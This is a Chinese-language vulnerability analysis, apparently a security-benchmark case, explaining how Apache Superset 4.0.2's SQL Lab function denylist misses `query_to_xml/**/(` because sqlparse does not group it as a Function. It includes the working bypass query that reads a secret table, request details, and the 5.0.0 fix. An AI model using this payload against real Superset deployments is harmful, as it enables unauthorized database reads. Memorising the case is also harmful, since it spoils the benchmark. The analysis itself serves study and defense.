# Superset 4.0.2：denylist 只认 sqlparse 的 Function 结点，`query_to_xml/**/(` 不是那种结点

- Case：`PCBV2-0045`（`INJ-01-superset-denylist`）
- 产品：Apache Superset。本 case 用官方镜像 `apache/superset:4.0.1/4.0.2/5.0.0`，低权限用户走真实 SQL Lab：`POST /api/v1/sqllab/execute/`。
- 链：CVE-2024-39887（4.0.1 → 4.0.2，PR #28639 增加 `DISALLOWED_SQL_FUNCTIONS` + `sql_parse.check_sql_functions_exist`）→ CVE-2025-55674 / GHSA-fxgf-3xh6-m2pp（5.0.0，sqlglot AST 的 `find_all(Func)`）。advisory：*A bypass of the DISALLOWED_SQL_FUNCTIONS security feature ... An attacker can use a special inline block to circumvent the denylist.*
- 源码对着 tag `4.0.2` 的 `superset/sql_parse.py`、`superset/db_engine_specs/base.py`、`superset/config.py`，以及 sqlparse 0.4.4 的 `group_functions`。本仓库 `patch.diff` 是 ROUND9 误同步的 dialect 表加 `"spark"`，**不是** CVE-2024-39887 的安全增量。

4.0.2 想拦住 SQL Lab 里点名 PostgreSQL 的 `query_to_xml` / `version` / `inet_server_addr` 这类能在引擎侧跑内层查询或泄信息的函数。实现是：用 sqlparse 把语句切成 token，只把 `sqlparse.sql.Function` 且 `get_name()` 落在 denylist 里的当成命中。sqlparse 把「Name 后面紧跟 Parenthesis」收成 Function；默认 `token_next` **不跳过注释**。函数名和 `(` 之间插 `/**/` 后，中间是 Comment，收不成 Function，denylist 看不见名字。PostgreSQL 把块注释当空白，照样调用。下面按 SQL Lab 走进去、4.0.2 加了哪段检查、sqlparse 如何分组、`query_to_xml/**/(` 为什么还能在引擎里执行，把这三层写完。

---

## 这块功能本来在干什么

SQL Lab 让登录用户对已授权的数据库提交 SQL。Superset 不是把任意函数都当业务查询：PostgreSQL 的 `query_to_xml(query, ...)` 会在数据库里执行内层 SQL 并返回 XML，绕过图表层的列级控制。4.0.2 起默认配置里有：

```python
# superset/config.py  (4.0.2, 约 L1209–1213)
DISALLOWED_SQL_FUNCTIONS: dict[str, set[str]] = {
    "postgresql": {"version", "query_to_xml", "inet_server_addr", "inet_client_addr"},
    "clickhouse": {"url"},
    "mysql": {"version"},
}
```

执行前 `BaseEngineSpec.execute` 取出当前引擎的集合，调用 `check_sql_functions_exist`。命中则抛 `DisallowedSQLFunction`，API 返回 HTTP 500，文案含 `SQL statement contains disallowed function(s)`。

本 case 的低权限用户 `analyst` 有 SQL Lab 权限，analytics Postgres 里有 `pcb_secret.val = PCB_FLAG`。一次典型请求（登录 + CSRF 之后）：

```http
POST /api/v1/sqllab/execute/
{"database_id": ..., "sql": "SELECT query_to_xml('SELECT val FROM pcb_secret', true, false, '')", ...}
```

能在 JSON 里看到 `<val>PCBFLAG_...</val>`，说明 **denylist 没拦住 `query_to_xml`，内层 SELECT 在 Postgres 里跑了**。flag 不在 Superset 源码里。

数据流：

```text
SQL Lab SQL
    → BaseEngineSpec.execute
         若 not allows_sql_comments：先剥注释（Postgres 默认 True，不剥）
         disallowed = DISALLOWED_SQL_FUNCTIONS[engine]
         sql_parse.check_sql_functions_exist(query, disallowed, engine)
              ParsedQuery(sql).check_functions_exist
                   只认 isinstance(token, Function)
    → 放行则把 SQL 交给 Postgres
    → query_to_xml 跑内层查询，XML 进 API body
```

设计意图：名字在 denylist 里的函数，无论参数怎么写，都不该到达引擎。成功穿越之后的效果是 **被禁函数在引擎侧执行，金丝雀出现在 XML 里**。

---

## 原始漏洞：没有函数 denylist（CVE-2024-39887 之前，4.0.1）

4.0.1 没有 `check_sql_functions_exist`，`base.py` 的 execute 路径不查函数名。`query_to_xml('SELECT val FROM pcb_secret', ...)` 原样到 Postgres，XML 里带 flag。这就是 v0 + `--seed` 退出码 0。CVE-2024-39887 要修的就是「引擎特有函数没被授权检查覆盖」。

---

## 维护者改了什么（CVE-2024-39887，4.0.2）

PR #28639 / commit `56f0103` 增加配置项，并在 `sql_parse.py` 里用 sqlparse 扫函数名。tag `4.0.2`：

```python
# sql_parse.py  (4.0.2)
def check_sql_functions_exist(sql, function_list, engine=None) -> bool:
    return ParsedQuery(sql, engine=engine).check_functions_exist(function_list)

class ParsedQuery:
    def __init__(self, sql_statement, strip_comments=False, engine=None):
        if strip_comments:
            sql_statement = sqlparse.format(sql_statement, strip_comments=True)
        self.sql = sql_statement
        self._parsed = sqlparse.parse(self.stripped())
        ...

    def _check_functions_exist_in_token(self, token, functions) -> bool:
        if (
            isinstance(token, Function)
            and token.get_name() is not None
            and token.get_name().lower() in functions
        ):
            return True
        if hasattr(token, "tokens"):
            for inner_token in token.tokens:
                if self._check_functions_exist_in_token(inner_token, functions):
                    return True
        return False

    def check_functions_exist(self, functions) -> bool:
        for statement in self._parsed:
            for token in statement.tokens:
                if self._check_functions_exist_in_token(token, functions):
                    return True
        return False
```

`check_sql_functions_exist` 构造 `ParsedQuery` 时 **不传 `strip_comments=True`**，因此不会在解析前用 sqlparse 剥注释。旁边另有：

```python
def strip_comments_from_sql(statement, engine=None) -> str:
    return (
        ParsedQuery(statement, engine=engine).strip_comments()
        if "--" in statement
        else statement
    )
```

它只在语句里出现 `--` 时才剥；`/**/` 不含 `--`，这条辅助函数直接原样返回。更关键的是：denylist 根本不调用它。

`base.py`（约 L1586–1592）在 Postgres 上 `allows_sql_comments = True`，不会因为注释去改写 SQL，然后才调 `check_sql_functions_exist`。

对 seed `SELECT query_to_xml('SELECT val FROM pcb_secret', true, false, '')`：sqlparse 把 `query_to_xml(...)` 收成 `Function`，`get_name()` 为 `query_to_xml`，落在 postgresql 集合里，抛 `DisallowedSQLFunction`。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 引擎里会被调用的函数，在 sqlparse 树里一定是 `Function` 结点。
2. 函数名和参数表在 token 流里相邻，中间没有「看起来像空白、对引擎无意义」但对分组有意义的东西。

第一点把「语义上的函数调用」等同于 sqlparse 的一种具体结点类型。

---

## sqlparse 怎样才把名字收成 Function

sqlparse 0.4.4 的 `group_functions`：

```python
# sqlparse/engine/grouping.py  (0.4.4, 约 L341–360)
def group_functions(tlist):
    ...
    tidx, token = tlist.token_next_by(t=T.Name)
    while token:
        nidx, next_ = tlist.token_next(tidx)
        if isinstance(next_, sql.Parenthesis):
            tlist.group_tokens(sql.Function, tidx, nidx)
        tidx, token = tlist.token_next_by(t=T.Name, idx=tidx)
```

`token_next` 默认 `skip_ws=True, skip_cm=False`：跳空白，**不跳注释**。因此：

```text
query_to_xml ( args )     → Name, Parenthesis     → 收成 Function
query_to_xml/**/( args )  → Name, Comment, Parenthesis
                            token_next(Name) 得到 Comment，不是 Parenthesis
                            不 group_tokens
                            树里没有 Function，只有 Identifier / Name + Comment + Parenthesis
```

`_check_functions_exist_in_token` 对非 Function 只做「若有 .tokens 则递归」。Name 的 `get_name()` 即使能拿到 `query_to_xml`，也过不了 `isinstance(token, Function)`。Comment 和 Parenthesis 都不是 Function。整棵树扫完返回 False，denylist 放行。

PostgreSQL 词法里 `/**/` 是空白。`query_to_xml/**/('SELECT val FROM pcb_secret', true, false, '')` 就是对 `query_to_xml` 的调用，内层 SELECT 读 `pcb_secret`。

---

## 这个补丁挡住了什么、没挡住什么

- `isinstance(token, Function) and get_name().lower() in functions`：看 sqlparse 有没有把这段收成函数结点
- Postgres：看注释当不当空白、名字后面的参数表执不执行

只要构造一种输入，使「引擎仍当作函数调用」但「sqlparse 不产生 Function」，第一行放行，第二行仍然执行。

`query_to_xml/**/(` 就是这样来的。GHSA 说的 special inline block，本 case 用的是空块注释 `/**/`，插在名字和 `(` 之间，不插 `--`（否则可能撞上别的剥注释路径，但 denylist 本就不剥）。

带上 SQL Lab：

```text
sql:  SELECT query_to_xml/**/('SELECT val FROM pcb_secret', true, false, '')

check_functions_exist:
  无 Function(query_to_xml) → False → 不抛

Postgres:
  等价 SELECT query_to_xml('SELECT val FROM pcb_secret', ...)
  XML 含 <val>PCBFLAG_...</val>
```

过滤器认为自己已经按函数名拒绝了 `query_to_xml`，实际上它只拒绝「被 sqlparse 收成 Function 的那种写法」。

---

## 残余仍然走同一条 SQL Lab execute（CVE-2025-55674）

没有换用户、没有换 API、没有换被禁函数。还是 `POST /api/v1/sqllab/execute/`，还是 `query_to_xml` 读 `pcb_secret`。唯一差别是名字和括号之间多了 `/**/`。

`verify.sh` 的 residual 写死为：

```text
SELECT query_to_xml/**/('SELECT val FROM pcb_secret', true, false, '')
```

认证：v1 + `--residual` 退出码 0，API JSON 里观察到 `PCBFLAG_...`。所以残余不是新洞面，而是同一 sink 上三件事叠在一起：谓词认的是 parser 的 Function 类型，不是「这个标识符会在引擎里当函数跑」；分组要求 Name 与 Parenthesis 相邻且中间只能是空白；Postgres 的空白包含块注释。seed 被挡住只说明「干净的 `name(` 没了」，不说明「denylist 上的函数不能再执行」。

---

## 后来又补了什么（CVE-2025-55674，5.0.0）

5.0.0 把 SQL 分析换成 sqlglot。`SQLScript.check_functions_present` 用 `find_all(Func)`：注释在 AST 构建时丢掉，函数结点仍在。`query_to_xml/**/(` 和 `query_to_xml(` 一样命中 denylist，HTTP 500，body 无 flag。commit `ce6d0d5963`（case.json 记载）。公开建议升级到 5.0.0。

即便如此，这仍然是「换一个 parser 再扫函数名」，不是在引擎侧禁用这些函数。对本条 `/**/` 链它够用。本 benchmark 的 v2 只关闭这条 reference residual。

---

## execute 真正调用 denylist 的位置

`BaseEngineSpec.execute`（4.0.2，约 L1586–1592）：

```python
if not cls.allows_sql_comments:
    query = sql_parse.strip_comments_from_sql(query)
disallowed_functions = current_app.config["DISALLOWED_SQL_FUNCTIONS"].get(
    cls.engine, set()
)
if sql_parse.check_sql_functions_exist(query, disallowed_functions, cls.engine):
    raise DisallowedSQLFunction(disallowed_functions)
```

Postgres 的 `allows_sql_comments = True`（约 L337），第一枝不跑。即便有人改成 False，`strip_comments_from_sql` 仍要求 `"--" in statement` 才实例化 `ParsedQuery.strip_comments()`；纯 `/**/` 语句原样留下。denylist 看到的 SQL 与引擎看到的 SQL，在这条 residual 上是同一串字符。

`sqlparse.parse` 的分组顺序里 `group_functions` 发生在语句已被切成 Name / Punctuation / Parenthesis / Comment 之后。Comment 的 token 类型是 `Comment.Multiline` 或 `Comment.Single`，`isinstance(next_, sql.Parenthesis)` 为假。没有「先剥注释再 group」的步骤。sqlglot 的 `parse` 在建 AST 时丢注释，`Func` 结点的名字仍是 `query_to_xml`，这才是 5.0.0 能挡住同一字符串的原因。

`get_name()` 对 Function 取标识符；对没成组的 Name，递归枝不会用 Name 去查 denylist。把 `isinstance(token, Function)` 改成「任何 Name 的值在集合里」会误伤列名/别名，也会挡住这次绕过——4.0.2 没这么做。维护者要的是「函数调用」，实现成了「sqlparse 认为的函数调用」。

低权限用户仍须有 SQL Lab + 该 database 的访问。denylist 不是认证，是认证之后的函数授权。flag 在 analytics 库里，不在 metadata sqlite 里。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 sqlparse 树上的结点类型。真正执行内层查询的是 Postgres。V2 仍在「提交前扫函数名」这一层，但换成会丢注释的 AST。

**不是没有剥注释的代码。**  
`strip_comments_from_sql` 和 `ParsedQuery(strip_comments=True)` 都在同一文件。denylist 入口两处都没用。即便用了，`--` 门闩也让纯 `/**/` 语句走不到 `format(strip_comments=True)`。

**同一 execute、同一 `query_to_xml`，只换了词法空白。**  
任何经 SQL Lab 到 Postgres 的查询在 4.0.2 上都吃这段 `check_functions_exist`。advisory 还提到泄版本信息；本 case 用 `query_to_xml` 读关系，效果更硬。

**金丝雀在 analytics DB 里是有意的。**  
flag 不在 Superset 进程环境里当查询结果返回，除非 `query_to_xml` 真的跑了内层 SELECT。

---

## 版本、入口、参考

| | 版本 | 函数 denylist | parser | 直接 `query_to_xml(` | `query_to_xml/**/(` |
|---|---|---|---|---|---|
| V0 | 4.0.1 | 无 | — | XML 含 flag | （不必） |
| V1 | 4.0.2 | sqlparse `Function` + `get_name()` | sqlparse | HTTP 500 | XML 含 flag |
| V2 | 5.0.0 | sqlglot `find_all(Func)` | sqlglot | 挡 | 挡 |

- Web：登录 → CSRF → `POST /api/v1/sqllab/execute/`。
- 认证（本平台）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到。
- [CVE-2024-39887](https://nvd.nist.gov/vuln/detail/CVE-2024-39887)、[CVE-2025-55674](https://nvd.nist.gov/vuln/detail/CVE-2025-55674)
- [GHSA-fxgf-3xh6-m2pp](https://github.com/advisories/GHSA-fxgf-3xh6-m2pp)
- PR [#28639](https://github.com/apache/superset/pull/28639)；tag `4.0.2` 的 `sql_parse.check_sql_functions_exist`、`ParsedQuery._check_functions_exist_in_token`；sqlparse `group_functions` / `token_next(skip_cm=False)`
